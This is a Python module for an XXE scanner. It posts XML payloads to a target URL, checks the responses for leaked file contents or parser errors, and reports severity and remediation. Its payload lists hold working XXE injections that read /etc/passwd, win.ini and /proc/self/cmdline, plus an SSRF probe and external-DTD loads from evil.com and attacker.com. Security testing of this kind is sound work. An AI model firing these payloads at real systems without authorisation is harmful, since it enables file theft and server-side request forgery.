import urllib.parse
from typing import Dict, List, Optional
from app.utils.http_client import fetch_url


def scan_xxe(scan_context: dict) -> dict:
    if not scan_context.get("url"):
        return {"error": "missing_url"}

    url = scan_context["url"]
    evidence = []
    is_vulnerable = False
    highest_confidence = 0.0

    xxe_payloads = [
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'file_read', '/etc/passwd'),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>', 'file_read', '/etc/hostname'),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', 'file_read', 'win.ini'),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/">]><foo>&xxe;</foo>', 'ssrf', 'localhost'),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><foo>&xxe;</foo>', 'file_read', 'cmdline'),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd"> %dtd;]>', 'external_dtd', 'external'),
        ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'file_read', 'passwd_utf8'),
        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY c SYSTEM "file:///etc/hosts">]><r>&c;</r>', 'file_read', 'hosts'),
    ]

    blind_xxe_payloads = [
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>', 'blind', 'external_entity'),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'blind', 'file_read'),
    ]

    try:
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)

        response = fetch_url(url)
        content_type = response.headers.get('Content-Type', '') if response else ''

        common_xml_params = [
            'xml', 'data', 'content', 'body', 'file', 'doc', 'upload',
            'xml_data', 'config', 'template', 'feed', 'channel'
        ]

        test_params = list(params.keys())
        if not test_params:
            test_params = common_xml_params[:3]

        if 'application/xml' in content_type or 'text/xml' in content_type:
            for payload, xxe_type, description in xxe_payloads:
                response = fetch_url(url, method="POST",
                                   headers={"Content-Type": "application/xml"},
                                   data=payload)
                if response:
                    vuln_data = analyze_xxe_response(
                        response.text, xxe_type, description, url, payload
                    )
                    if vuln_data and vuln_data.get('confidence', 0) > highest_confidence:
                        highest_confidence = vuln_data['confidence']
                        evidence.append(vuln_data)
                        if highest_confidence >= 0.7:
                            is_vulnerable = True

        for param_name in test_params:
            for payload, xxe_type, description in xxe_payloads[:4]:
                test_params_dict = params.copy()
                test_params_dict[param_name] = [payload]

                new_query = urllib.parse.urlencode(test_params_dict, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))

                response = fetch_url(test_url, method="GET")
                if response:
                    vuln_data = analyze_xxe_response(
                        response.text, xxe_type, description, test_url, payload
                    )
                    if vuln_data and vuln_data.get('confidence', 0) > highest_confidence:
                        highest_confidence = vuln_data['confidence']
                        evidence.append(vuln_data)
                        if highest_confidence >= 0.7:
                            is_vulnerable = True

                response = fetch_url(url, method="POST",
                                   headers={"Content-Type": "application/xml"},
                                   data=payload)
                if response:
                    vuln_data = analyze_xxe_response(
                        response.text, xxe_type, description, url, payload
                    )
                    if vuln_data and vuln_data.get('confidence', 0) > highest_confidence:
                        highest_confidence = vuln_data['confidence']
                        evidence.append(vuln_data)
                        if highest_confidence >= 0.7:
                            is_vulnerable = True

        for payload, xxe_type, description in blind_xxe_payloads[:2]:
            response = fetch_url(url, method="POST",
                               headers={"Content-Type": "application/xml"},
                               data=payload)
            if response:
                if response.status_code != 500:
                    evidence.append({
                        "type": "potential_xxe",
                        "xxe_type": xxe_type,
                        "description": description,
                        "test_url": url,
                        "evidence": "XML parsed without error - potential blind XXE",
                        "confidence": 0.4
                    })

    except Exception as e:
        return {
            "vulnerability_type": "xxe",
            "is_vulnerable": False,
            "severity": "info",
            "confidence": 0.0,
            "evidence": [{"type": "error", "value": f"Scanner error: {str(e)}"}],
            "recommendation": "An error occurred during XXE scanning."
        }

    severity = determine_severity(highest_confidence)

    return {
        "vulnerability_type": "xxe",
        "is_vulnerable": is_vulnerable,
        "severity": severity,
        "confidence": highest_confidence,
        "evidence": evidence,
        "recommendation": get_xxe_recommendation(is_vulnerable, highest_confidence)
    }


def analyze_xxe_response(response_text: str, xxe_type: str, description: str,
                         test_url: str, payload: str) -> Optional[Dict]:
    file_content_indicators = [
        "root:x:", "/bin/bash", "/bin/sh", "daemon:x:",
        "[fonts]", "[extensions]", "[mci extensions]",
        "localhost"
    ]

    xxe_error_patterns = [
        "xml", "parser", "parse", "entity", "dtd",
        "external", "doctype", "xinclude", "xsd"
    ]

    response_lower = response_text.lower()

    if xxe_type == "file_read":
        for indicator in file_content_indicators:
            if indicator in response_text:
                return {
                    "type": "file_exfiltration",
                    "xxe_type": xxe_type,
                    "description": description,
                    "test_url": test_url,
                    "evidence": f"Successfully read system file content",
                    "confidence": 0.95
                }

    for pattern in xxe_error_patterns:
        if pattern in response_lower:
            return {
                "type": "xxe_error",
                "xxe_type": xxe_type,
                "description": description,
                "test_url": test_url,
                "evidence": f"XXE-related error detected: {pattern}",
                "confidence": 0.6
            }

    if len(response_text) > 500 and xxe_type in ["file_read", "ssrf"]:
        return {
            "type": "potential",
            "xxe_type": xxe_type,
            "description": description,
            "test_url": test_url,
            "evidence": "Unusual response length - possible data exfiltration",
            "confidence": 0.3
        }

    return None


def determine_severity(confidence: float) -> str:
    if confidence >= 0.9:
        return "critical"
    elif confidence >= 0.7:
        return "high"
    elif confidence >= 0.5:
        return "medium"
    else:
        return "low"


def get_xxe_recommendation(is_vulnerable: bool, confidence: float) -> str:
    if not is_vulnerable:
        return "No XXE vulnerabilities detected. Continue following secure XML processing practices."

    if confidence >= 0.9:
        return ("CRITICAL: XML External Entity (XXE) vulnerability confirmed. "
                "The application processes XML without proper sanitization. "
                "Immediate action required: "
                "1. Disable external entity processing in XML parsers. "
                "2. Use safe XML parsers with security features enabled. "
                "3. Implement whitelist-based input validation. "
                "4. Disable DTD (Document Type Definition) processing. "
                "5. Use JSON instead of XML where possible.")
    else:
        return ("Potential XXE vulnerability detected. "
                "Review XML parser configuration, disable external entities, "
                "and implement input validation.")
